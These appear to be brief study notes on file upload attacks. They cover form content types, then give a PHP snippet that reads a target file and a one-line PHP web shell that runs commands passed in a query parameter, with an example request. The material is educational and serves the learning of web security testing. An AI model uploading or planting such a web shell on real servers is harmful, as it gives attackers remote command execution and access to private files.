# File Upload

When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

MIME Type (RFC 6838)




# PHP
`<?php echo file_get_contents('/path/to/target/file'); ?>`
Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`
This script enables you to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1`